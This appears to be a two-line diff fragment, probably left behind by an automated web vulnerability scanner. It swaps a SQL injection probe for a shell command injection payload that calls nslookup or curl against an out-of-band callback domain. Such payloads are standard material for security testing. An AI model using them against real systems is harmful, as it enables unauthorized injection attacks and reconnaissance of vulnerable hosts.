@@ -1,1 +1,1 @@
--1' OR 2+692-692-1=0+0+0+1 -- 
+(nslookup -q=cname hittstkekusgic7147.bxss.me||curl hittstkekusgic7147.bxss.me))
